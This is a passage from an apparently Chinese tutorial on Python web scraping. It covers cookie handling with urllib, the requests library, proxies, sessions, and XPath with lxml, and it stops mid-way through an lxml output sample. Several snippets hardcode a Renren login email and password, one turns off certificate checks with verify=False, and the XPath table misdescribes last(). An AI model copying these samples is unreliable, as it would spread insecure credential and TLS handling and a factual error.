是指网站服务器为了辨别用户身份和进行Session跟踪，而储存在用户浏览器上的文本文件，Cookie可以保持登录信息到用户下次与服务器的会话。<br>这里以人人网为例。人人网中，要访问某个人的主页，必须先登录才能访问，登录说白了就是要有cookie信息。那么如果我们想要用代码的方式访问，就必须要有正确的cookie信息才能访问。<br>解决方案有两种，第一种是使用浏览器访问，然后将cookie信息复制下来，放到headers中。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;略去&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line"></span><br><span class="line">req = request.Request(url,headers=headers)</span><br><span class="line">resp = request.urlopen(req)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>但是每次在访问需要cookie的页面都要从浏览器中复制cookie比较麻烦。在Python处理Cookie，一般是通过<code>http.cookiejar</code>模块和<code>urllib模块的HTTPCookieProcessor</code>处理器类一起使用。<code>http.cookiejar</code>模块主要作用是提供用于存储cookie的对象。而<code>HTTPCookieProcessor</code>处理器主要作用是处理这些cookie对象，并构建handler对象。</p><h2 id="http-cookiejar模块："><a class="header-anchor" href="#http-cookiejar模块：">¶</a>http.cookiejar模块：</h2><p>该模块主要的类有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。这四个类的作用分别如下：</p><ol><li>CookieJar：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。</li><li>FileCookieJar (filename,delayload=None,policy=None)：从CookieJar派生而来，用来创建FileCookieJar实例，检索cookie信息并将cookie存储到文件中。filename是存储cookie的文件名。delayload为True时支持延迟访问访问文件，即只有在需要时才读取文件或在文件中存储数据。</li><li>MozillaCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与Mozilla浏览器 cookies.txt兼容的FileCookieJar实例。</li><li>LWPCookieJar (filename,delayload=None,policy=None)：从FileCookieJar派生而来，创建与libwww-perl标准的 Set-Cookie3 文件格式兼容的FileCookieJar实例。</li></ol><h2 id="登录人人网："><a class="header-anchor" href="#登录人人网：">¶</a>登录人人网：</h2><p>利用<code>http.cookiejar</code>和<code>request.HTTPCookieProcessor</code>登录人人网。相关示例代码如下：（经测试人人网已经不能这样爬了，仅作一例）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request,parse</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> CookieJar</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_opener</span>():</span></span><br><span class="line">    cookiejar = CookieJar()</span><br><span class="line">    handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">    opener = request.build_opener(handler)</span><br><span class="line">    <span class="keyword">return</span> opener</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login_renren</span>(<span class="params">opener</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;970138074@qq.com&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">    data = parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    login_url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">    req = request.Request(login_url, headers=headers, data=data)</span><br><span class="line">    opener.<span class="built_in">open</span>(req)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit_profile</span>(<span class="params">opener</span>):</span></span><br><span class="line">    url = <span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span></span><br><span class="line">    req = request.Request(url,headers=headers)</span><br><span class="line">    resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;renren.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(resp.read().decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    opener = get_opener()</span><br><span class="line">    login_renren(opener)</span><br><span class="line">    visit_profile(opener)//同一个opener，存了先前访问的cookie</span><br></pre></td></tr></table></figure><h2 id="保存cookie到本地："><a class="header-anchor" href="#保存cookie到本地：">¶</a>保存cookie到本地：</h2><p>保存<code>cookie</code>到本地，可以使用<code>cookiejar</code>的<code>save</code>方法，并且需要指定一个文件名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br><span class="line">cookiejar.save(ignore_discard=<span class="literal">True</span>,ignore_expires=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="从本地加载cookie："><a class="header-anchor" href="#从本地加载cookie：">¶</a>从本地加载cookie：</h2><p>从本地加载<code>cookie</code>，需要使用<code>cookiejar</code>的<code>load</code>方法，并且也需要指定方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> http.cookiejar <span class="keyword">import</span> MozillaCookieJar</span><br><span class="line"></span><br><span class="line">cookiejar = MozillaCookieJar(<span class="string">&quot;cookie.txt&quot;</span>)</span><br><span class="line">cookiejar.load(ignore_expires=<span class="literal">True</span>,ignore_discard=<span class="literal">True</span>)</span><br><span class="line">handler = request.HTTPCookieProcessor(cookiejar)</span><br><span class="line">opener = request.build_opener(handler)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req = request.Request(<span class="string">&#x27;http://httpbin.org/cookies&#x27;</span>,headers=headers)</span><br><span class="line"></span><br><span class="line">resp = opener.<span class="built_in">open</span>(req)</span><br><span class="line"><span class="built_in">print</span>(resp.read())</span><br></pre></td></tr></table></figure><h1>requests库</h1><p>虽然Python的标准库中 urllib模块已经包含了平常我们使用的大多数功能，但是它的 API 使用起来让人感觉不太好，而 Requests宣传是 “HTTP for Humans”，说明使用更简洁方便。</p><h2 id="安装和文档地址："><a class="header-anchor" href="#安装和文档地址：">¶</a>安装和文档地址：</h2><p>利用<code>pip</code>可以非常方便的安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install requests</span><br></pre></td></tr></table></figure><p>中文文档：<a href="http://docs.python-requests.org/zh_CN/latest/index.html">http://docs.python-requests.org/zh_CN/latest/index.html</a><br>github地址：<a href="https://github.com/requests/requests">https://github.com/requests/requests</a></p><h2 id="发送GET请求："><a class="header-anchor" href="#发送GET请求：">¶</a>发送GET请求：</h2><ol><li><p>最简单的发送<code>get</code>请求就是通过<code>requests.get</code>来调用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p>添加headers和查询参数：<br>如果想添加 headers，可以传入headers参数来增加请求头中的headers信息。如果要将参数放在url中传递，可以利用 params 参数。相关示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">kw = &#123;<span class="string">&#x27;wd&#x27;</span>:<span class="string">&#x27;中国&#x27;</span>&#125;</span><br><span class="line">   </span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36&quot;</span>&#125;</span><br><span class="line">   </span><br><span class="line"><span class="comment"># params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()</span></span><br><span class="line">response = requests.get(<span class="string">&quot;http://www.baidu.com/s&quot;</span>, params = kw, headers = headers)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.text 返回的是Unicode格式的数据</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应内容，response.content返回的字节流数据</span></span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看完整url地址</span></span><br><span class="line"><span class="built_in">print</span>(response.url)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应头部字符编码</span></span><br><span class="line"><span class="built_in">print</span>(response.encoding)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># 查看响应码</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)</span><br></pre></td></tr></table></figure></li></ol><h2 id="发送POST请求："><a class="header-anchor" href="#发送POST请求：">¶</a>发送POST请求：</h2><ol><li><p>最基本的POST请求可以使用<code>post</code>方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.post(<span class="string">&quot;http://www.baidu.com/&quot;</span>,data=data)</span><br></pre></td></tr></table></figure></li><li><p>传入data数据：<br>这时候就不要再使用<code>urlencode</code>进行编码了，直接传入一个字典进去就可以了。比如请求拉勾网的数据的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">   </span><br><span class="line">url = <span class="string">&quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;</span></span><br><span class="line">   </span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;first&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pn&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;kd&#x27;</span>: <span class="string">&#x27;python&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line">resp = requests.post(url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># 如果是json数据，直接可以调用json方法</span></span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br></pre></td></tr></table></figure></li></ol><h2 id="使用代理："><a class="header-anchor" href="#使用代理：">¶</a>使用代理：</h2><p>使用<code>requests</code>添加代理也非常简单，只要在请求的方法中（比如<code>get</code>或者<code>post</code>）传递<code>proxies</code>参数就可以了。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">proxy = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;171.14.209.180:27829&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url,headers=headers,proxies=proxy)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;xx.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(resp.text)</span><br></pre></td></tr></table></figure><h2 id="cookie："><a class="header-anchor" href="#cookie：">¶</a>cookie：</h2><p>如果在一个响应中包含了<code>cookie</code>，那么可以利用<code>cookies</code>属性拿到这个返回的<code>cookie</code>值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://www.baidu.com/&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies)</span><br><span class="line"><span class="built_in">print</span>(resp.cookies.get_dict())</span><br></pre></td></tr></table></figure><h2 id="session："><a class="header-anchor" href="#session：">¶</a>session：</h2><p>之前使用<code>urllib</code>库，是可以使用<code>opener</code>发送多个请求，多个请求之间是可以共享<code>cookie</code>的。那么如果使用<code>requests</code>，也要达到共享<code>cookie</code>的目的，那么可以使用<code>requests</code>库给我们提供的<code>session</code>对象。注意，这里的<code>session</code>不是web开发中的那个session，这个地方只是一个会话的对象而已。还是以登录人人网为例，使用<code>requests</code>来实现。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.renren.com/PLogin.do&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;email&quot;</span>:<span class="string">&quot;970138074@qq.com&quot;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;pythonspider&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">session = requests.session()</span><br><span class="line">session.post(url,data=data,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问大鹏个人中心</span></span><br><span class="line">resp = session.get(<span class="string">&#x27;http://www.renren.com/880151247/profile&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><h2 id="处理不信任的SSL证书："><a class="header-anchor" href="#处理不信任的SSL证书：">¶</a>处理不信任的SSL证书：</h2><p>对于那些已经被信任的SSL证书的网站，比如<code>https://www.baidu.com/</code>，那么使用<code>requests</code>直接就可以正常的返回响应。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.get(<span class="string">&#x27;http://www.12306.cn/mormhweb/&#x27;</span>,verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1>XPath语法和lxml模块</h1><h2 id="什么是XPath？"><a class="header-anchor" href="#什么是XPath？">¶</a>什么是XPath？</h2><p>xpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。</p><h2 id="XPath语法"><a class="header-anchor" href="#XPath语法">¶</a>XPath语法</h2><h3 id="选取节点："><a class="header-anchor" href="#选取节点：">¶</a>选取节点：</h3><p>XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。</p><table><thead><tr><th>表达式</th><th>描述</th><th>示例</th><th>结果</th></tr></thead><tbody><tr><td>nodename</td><td>选取此节点的所有子节点</td><td>bookstore</td><td>选取bookstore下所有的子节点</td></tr><tr><td>/</td><td>如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点</td><td>/bookstore</td><td>选取根元素下所有的bookstore节点</td></tr><tr><td>//</td><td>从全局节点中选择节点，随便在哪个位置</td><td>//book</td><td>从全局节点中找到所有的book节点</td></tr><tr><td>@</td><td>选取某个节点的属性</td><td>//book[@price]</td><td>选择所有拥有price属性的book节点</td></tr><tr><td>.</td><td>当前节点</td><td>./a</td><td>选取当前节点下的a标签</td></tr></tbody></table><h3 id="谓语："><a class="header-anchor" href="#谓语：">¶</a>谓语：</h3><p>谓语用来查找某个特定的节点或者包含某个指定的值的节点，被嵌在方括号中。<br>在下面的表格中，我们列出了带有谓语的一些路径表达式，以及表达式的结果：</p><table><thead><tr><th>路径表达式</th><th>描述</th></tr></thead><tbody><tr><td>/bookstore/book[1]</td><td>选取bookstore下的第一个子元素</td></tr><tr><td>/bookstore/book[last()]</td><td>选取bookstore下的倒数第二个book元素。</td></tr><tr><td>bookstore/book[position()&lt;3]</td><td>选取bookstore下前面两个子元素。</td></tr><tr><td>//book[@price]</td><td>选取拥有price属性的book元素</td></tr><tr><td>//book[@price=10]</td><td>选取所有属性price等于10的book元素</td></tr></tbody></table><h3 id="通配符"><a class="header-anchor" href="#通配符">¶</a>通配符</h3><p>*表示通配符。</p><table><thead><tr><th style="text-align:left">通配符</th><th style="text-align:left">描述</th><th style="text-align:left">示例</th><th style="text-align:left">结果</th></tr></thead><tbody><tr><td style="text-align:left">*</td><td style="text-align:left">匹配任意节点</td><td style="text-align:left">/bookstore/*</td><td style="text-align:left">选取bookstore下的所有子元素。</td></tr><tr><td style="text-align:left">@*</td><td style="text-align:left">匹配节点中的任何属性</td><td style="text-align:left">//book[@*]</td><td style="text-align:left">选取所有带有属性的book元素。</td></tr></tbody></table><h3 id="选取多个路径："><a class="header-anchor" href="#选取多个路径：">¶</a>选取多个路径：</h3><p>通过在路径表达式中使用“|”运算符，可以选取若干个路径。<br>示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//bookstore/book | //book/title</span><br><span class="line"># 选取所有book元素以及book元素下所有的title元素</span><br></pre></td></tr></table></figure><h2 id="lxml库"><a class="header-anchor" href="#lxml库">¶</a>lxml库</h2><p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p><p>lxml和正则一样，也是用 C 实现的，是一款高性能的 Python HTML/XML 解析器，我们可以利用之前学习的XPath语法，来快速的定位特定元素以及节点信息。</p><p>需要安装C语言库，可使用 pip 安装：<code>pip install lxml</code></p><h3 id="基本使用："><a class="header-anchor" href="#基本使用：">¶</a>基本使用：</h3><p>我们可以利用他来解析HTML代码，并且在解析HTML代码的时候，如果HTML代码不规范，他会自动的进行补全。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 lxml 的 etree 库</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree </span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;div&gt;</span></span><br><span class="line"><span class="string">    &lt;ul&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;first item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;second item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-inactive&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;third item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;fourth item&lt;/a&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">         &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;fifth item&lt;/a&gt; # 注意，此处缺少一个 &lt;/li&gt; 闭合标签</span></span><br><span class="line"><span class="string">     &lt;/ul&gt;</span></span><br><span class="line"><span class="string"> &lt;/div&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#利用etree.HTML，将字符串解析为HTML文档</span></span><br><span class="line">html = etree.HTML(text) </span><br><span class="line"></span><br><span class="line"><span class="comment"># 按字符串序列化HTML文档</span></span><br><span class="line">result = etree.tostring(html) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 